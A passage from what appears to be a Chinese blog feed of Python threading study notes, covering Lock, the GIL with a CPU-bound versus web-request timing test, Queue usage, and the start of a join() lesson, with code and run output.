number">57</span>job2 <span class="token number">67</span>job2 <span class="token number">77</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从运行结果来看，使用lock后，一个线程一个线程的执行完，两个线程之间互不影响。<br>至此，整个【Python Threading 学习笔记】系列更新完毕。</p><blockquote><p>代码项目地址：<a href="https://github.com/teamssix/Python-Threading-study-notes">https://github.com/teamssix/Python-Threading-study-notes</a><br>参考文章：<br>1、<a href="https://www.jianshu.com/p/05b6a6f6fdac">https://www.jianshu.com/p/05b6a6f6fdac</a><br>2、<a href="https://morvanzhou.github.io/tutorials/python-basic/threading">https://morvanzhou.github.io/tutorials/python-basic/threading</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python Threading 学习笔记】5、不一定有效率GIL</title>
      <link href="//191104-101112.html"/>
      <url>//191104-101112.html</url>
      
        <content type="html"><![CDATA[<p>往期内容：</p><p><a href="https://www.teamssix.com/year/1901031-202253.html">1、什么是多线程？</a></p><p><a href="https://www.teamssix.com/year/191101-112015.html">2、添加线程</a></p><p><a href="https://www.teamssix.com/year/191102-102624.html">3、join功能</a></p><p><a href="https://www.teamssix.com/year/191103-092239.html">4、Queue功能</a></p><h1 id="0x00-关于GIL"><a href="#0x00-关于GIL" class="headerlink" title="0x00 关于GIL"></a>0x00 关于GIL</h1><p>GIL的全称是Global Interpreter Lock(全局解释器锁)，来源是python设计之初的考虑，为了数据安全所做的决定。</p><a id="more"></a><p>每个CPU在同一时间只能执行一个线程（在单核CPU下的多线程其实都只是并发，不是并行，并发和并行从宏观上来讲都是同时处理多路请求的概念。但并发和并行又有区别，并行是指两个或者多个事件在同一时刻发生；而并发是指两个或多个事件在同一时间间隔内发生。）</p><p>在Python多线程下，每个线程的执行方式如下：</p><p>1.获取GIL</p><p>2.执行代码直到sleep或者是python虚拟机将其挂起。</p><p>3.释放GIL</p><p>可见，某个线程想要执行，必须先拿到GIL，我们可以把GIL看作是“通行证”，并且在一个python进程中，GIL只有一个。拿不到通行证的线程，就不允许进入CPU执行。</p><p>也就是说尽管Python支持多线程，但是因为GIL的存在，使得Python还是一次性只能处理一个东西，那是不是说Python中的多线程就完全没用了呢，当然不是的。</p><p>GIL往往只会影响到那些严重依赖CPU的程序，比如各种循环处理、计数等这种CPU密集型的程序；如果程序中大部分只会涉及到I/O，比如文件处理、网络爬虫等这种IO密集型的程序，那么多线程就能够有效的提高效率，因为在爬虫的时候大部分时间都在等待。</p><p>实际上，你完全可以放心的创建几千个Python线程， 现代操作系统运行这么多线程没有任何压力，没啥可担心的。</p><h1 id="0x01-测试GIL"><a href="#0x01-测试GIL" class="headerlink" title="0x01 测试GIL"></a>0x01 测试GIL</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> copy<span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">from</span> queue <span class="token keyword">import</span> Queue<span class="token keyword">def</span> <span class="token function">job</span><span class="token punctuation">(</span>lists<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>   res <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>lists<span class="token punctuation">)</span>   q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">multithreading</span><span class="token punctuation">(</span>lists<span class="token punctuation">)</span><span class="token punctuation">:</span>   q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>   threads_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>job<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>copy<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>lists<span class="token punctuation">)</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">'任务 %i'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>      t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>      threads_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>   <span class="token keyword">for</span> t <span class="token keyword">in</span> threads_list<span class="token punctuation">:</span>      t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>   total <span class="token operator">=</span> <span class="token number">0</span>   <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      total <span class="token operator">+=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'使用线程运算结果:'</span><span class="token punctuation">,</span>total<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">normal</span><span class="token punctuation">(</span>lists<span class="token punctuation">)</span><span class="token punctuation">:</span>   total <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>lists<span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'不使用线程运算结果:'</span><span class="token punctuation">,</span>total<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">req_job</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>   requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">req_multithreading</span><span class="token punctuation">(</span>req_lists<span class="token punctuation">)</span><span class="token punctuation">:</span>   threads_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>req_job<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>req_lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'爬虫任务 %i'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>      t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>      threads_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>   <span class="token keyword">for</span> t <span class="token keyword">in</span> threads_list<span class="token punctuation">:</span>      t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">req_normal</span><span class="token punctuation">(</span>req_lists<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> req_lists<span class="token punctuation">:</span>      requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   lists <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 完成一个较大的计算</span>   req_lists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://www.teamssix.com'</span><span class="token punctuation">,</span><span class="token string">'https://github.com/teamssix'</span><span class="token punctuation">,</span><span class="token string">'https://me.csdn.net/qq_37683287'</span><span class="token punctuation">,</span><span class="token string">'https://space.bilibili.com/148389186'</span><span class="token punctuation">]</span>   start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>   multithreading<span class="token punctuation">(</span>lists<span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算使用线程耗时:'</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">,</span><span class="token string">'\n'</span><span class="token punctuation">)</span>   start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>   normal<span class="token punctuation">(</span>lists <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算不使用线程耗时:'</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">,</span><span class="token string">'\n'</span><span class="token punctuation">)</span>   start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>   req_multithreading<span class="token punctuation">(</span>req_lists<span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'爬虫使用线程耗时:'</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">)</span>   start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>   req_normal<span class="token punctuation">(</span>req_lists<span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'爬虫不使用线程耗时:'</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python 5_GIL.py</span>使用线程运算结果: <span class="token number">1999998000000</span>计算使用线程耗时: <span class="token number">0.39594030380249023</span> 不使用线程运算结果: <span class="token number">1999998000000</span>计算不使用线程耗时: <span class="token number">0.3919515609741211</span>爬虫使用线程耗时: <span class="token number">2.2410056591033936</span>爬虫不使用线程耗时: <span class="token number">7.1159656047821045</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到在计算程序的代码中不使用线程和使用线程的运算结果是相同的，说明不使用线程和使用线程的程序都进行了一样多次的运算，但是很明显可以看到计算的耗时并没有少很多，按照预期我们使用了4个线程，应该会快近4倍才对，这就是因为GIL在作怪。<br>与此同时，可以看到在使用request对一个url发起get请求的时候，使用线程比不使用线程快了3倍多，也进一步的反映出在使用Python进行爬虫的时候，多线程确实可以很大程度上提高效率，但是在进行密集计算任务的时候，多线程就显得很鸡肋了。</p><blockquote><p>代码项目地址：<a href="https://github.com/teamssix/Python-Threading-study-notes">https://github.com/teamssix/Python-Threading-study-notes</a><br>参考文章：<br>1、<a href="https://zhuanlan.zhihu.com/p/20953544">https://zhuanlan.zhihu.com/p/20953544</a><br>2、<a href="https://morvanzhou.github.io/tutorials/python-basic/threading">https://morvanzhou.github.io/tutorials/python-basic/threading</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python Threading 学习笔记】4、Queue功能</title>
      <link href="//191103-092239.html"/>
      <url>//191103-092239.html</url>
      
        <content type="html"><![CDATA[<p>往期内容：</p><p><a href="https://www.teamssix.com/year/1901031-202253.html">1、什么是多线程？</a></p><p><a href="https://www.teamssix.com/year/191101-112015.html">2、添加线程</a></p><p><a href="https://www.teamssix.com/year/191102-102624.html">3、join功能</a></p><h1 id="0x00-关于Queue"><a href="#0x00-关于Queue" class="headerlink" title="0x00 关于Queue"></a>0x00 关于Queue</h1><p>queue模块实现了各种【多生产者-多消费者】队列，可用于在执行的多个线程之间安全的交换信息。</p><a id="more"></a><p><strong>queue的常用方法：</strong></p><pre class="line-numbers language-none"><code class="language-none">q.size()：返回队列的正确大小。因为其他线程可能正在更新此队列，所以此方法的返回数字不可靠。q.empty()：如果队列为空，返回True，否则返回False。q.full()：如果队列已满，返回True，否则返回False。q.put(item,block,timeout)：将item放入队列。如果block设为True（默认值），调用者将被阻塞直到队列中出现可用的空闲位置为止。如果block设为False，队列满时此方法将引发Full异常。q.put_nowait(item):等价于q.put(item,False)q.get(block,timeout):从队列中删除一项，然后返回这个项。如果block设为True（默认值），调用者将阻塞，直到队列中出现可用的空闲为止。如果block设为False，队列为空时将引发Empty异常。timeout提供可选的超时值，单位为秒，如果超时，将引发Empty异常。q.get_nowait()：等价于get(0)q.task_done():在队列中数据的消费者用来指示对于项的处理已经结束。如果使用此方法，那么从队列中删除的每一项都应该调用一次。q.join()：阻塞直到队列中的所有项均被删除和处理为止。一旦为队列中的每一项都调用了一次q.task_done()方法，此方法将会直接返回。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x01-本节代码实现功能"><a href="#0x01-本节代码实现功能" class="headerlink" title="0x01 本节代码实现功能"></a>0x01 本节代码实现功能</h1><p>将数据列表中的数据传入，使用三个线程处理，将结果保存在Queue中，线程执行完后，从Queue中获取存储的结果。</p><h1 id="0x02导入线程-队列的标准模块"><a href="#0x02导入线程-队列的标准模块" class="headerlink" title="0x02导入线程,队列的标准模块"></a>0x02导入线程,队列的标准模块</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">import</span> threading<span class="token keyword">from</span> queue <span class="token keyword">import</span> Queue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="0x03-定义一个被多线程调用的函数"><a href="#0x03-定义一个被多线程调用的函数" class="headerlink" title="0x03 定义一个被多线程调用的函数"></a>0x03 定义一个被多线程调用的函数</h1><p>该函数的参数是一个列表lists和一个队列q，其功能是对lists列表中的元素除2取整，之后利用q.put()将结果保存在队列q中。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">job</span><span class="token punctuation">(</span>lists<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 被调用函数</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>lists<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">//</span><span class="token number">2</span> <span class="token comment"># lists元素除2取整</span>    q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>lists<span class="token punctuation">)</span> <span class="token comment"># 多线程调用的函数不能用return返回值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x04-定义一个多线程函数"><a href="#0x04-定义一个多线程函数" class="headerlink" title="0x04 定义一个多线程函数"></a>0x04 定义一个多线程函数</h1><p>在多线程函数中定义一个Queue用来保存返回值代替return，同时定义一个多线程列表，初始化一个多维数据列表用来传入上面的job()函数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">multithreading</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 调用多线程的函数</span>    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 存放job()函数的返回值</span>    thread_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>定义三个线程，启动线程并分别join三个线程到主线程</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 定义三个线程</span>    t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>job<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    thread_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token comment"># 将线程添加到thread_list列表中 </span><span class="token keyword">for</span> thread <span class="token keyword">in</span> thread_list<span class="token punctuation">:</span>    thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定义一个空的result_list列表，将队列q中的数据添加到列表中并print</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">result_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 循环三次</span>    result_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result_list<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x05-完整的代码"><a href="#0x05-完整的代码" class="headerlink" title="0x05 完整的代码"></a>0x05 完整的代码</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">import</span> threading<span class="token keyword">from</span> queue <span class="token keyword">import</span> Queue<span class="token keyword">def</span> <span class="token function">job</span><span class="token punctuation">(</span>lists<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 被调用函数</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>lists<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">//</span><span class="token number">2</span> <span class="token comment"># lists元素除2取整</span>    q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>lists<span class="token punctuation">)</span> <span class="token comment"># 多线程调用的函数不能用return返回值</span><span class="token keyword">def</span> <span class="token function">multithreading</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 调用多线程的函数</span>    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 存放job()函数的返回值</span>    thread_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 定义三个线程</span>        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>job<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        thread_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token comment"># 将线程添加到thread_list列表中</span>    <span class="token keyword">for</span> thread <span class="token keyword">in</span> thread_list<span class="token punctuation">:</span>        thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    result_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 循环三次</span>        result_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>result_list<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    multithreading<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python 4_queue.py</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span>, <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span>, <span class="token number">2</span>, <span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>代码项目地址：<a href="https://github.com/teamssix/Python-Threading-study-notes">https://github.com/teamssix/Python-Threading-study-notes</a><br>参考文章：<br>1、<a href="https://segmentfault.com/a/1190000016330288">https://segmentfault.com/a/1190000016330288</a><br>2、<a href="https://morvanzhou.github.io/tutorials/python-basic/threading">https://morvanzhou.github.io/tutorials/python-basic/threading</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python Threading 学习笔记】3、join功能</title>
      <link href="//191102-102624.html"/>
      <url>//191102-102624.html</url>
      
        <content type="html"><![CDATA[<p>往期内容：</p><p><a href="https://www.teamssix.com/year/1901031-202253.html">1、什么是多线程？</a></p><p><a href="https://www.teamssix.com/year/191101-112015.html">2、添加线程</a></p><h1 id="0x00-不使用join-的结果"><a href="#0x00-不使用join-的结果" class="headerlink" title="0x00 不使用join()的结果"></a>0x00 不使用join()的结果</h1><p>首先在上一节的示例基础上进行简单修改</p><a id="more"></a><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">thread_jobs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 定义要添加的线程</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'任务1开始\n'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'任务1结束\n'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>thread_jobs<span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'任务1'</span><span class="token punctuation">)</span>  <span class="token comment"># 定义线程</span>    thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 开始线程</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'所有任务已完成\n'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>预计输出结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python 3_join.py</span>任务1开始任务1结束所有任务已完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>实际输出结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python 3_join.py</span>任务1开始所有任务已完成任务1结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到在线程还没有结束的时候，程序就开始运行之后的代码了，也就是说线程和其他部分的程序都是同步进行的，如果想要避免这种情况，想要程序按照代码顺序执行的话，就需要用到join功能。</p><h1 id="0x01-使用join-的结果"><a href="#0x01-使用join-的结果" class="headerlink" title="0x01 使用join()的结果"></a>0x01 使用join()的结果</h1><p>在源代码thread.start()下加入thread.join()即可，原来代码的main函数就变成这样：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>thread_jobs<span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'任务1'</span><span class="token punctuation">)</span>  <span class="token comment"># 定义线程</span>    thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 开始线程</span>    thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#加入join功能</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'所有任务已完成\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里就表示必须要等到任务1这个线程结束后，才能执行thread.join()之后的代码，代码运行结果如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python 3_join.py</span>任务1开始任务1结束所有任务已完成<span aria-hidden="true" 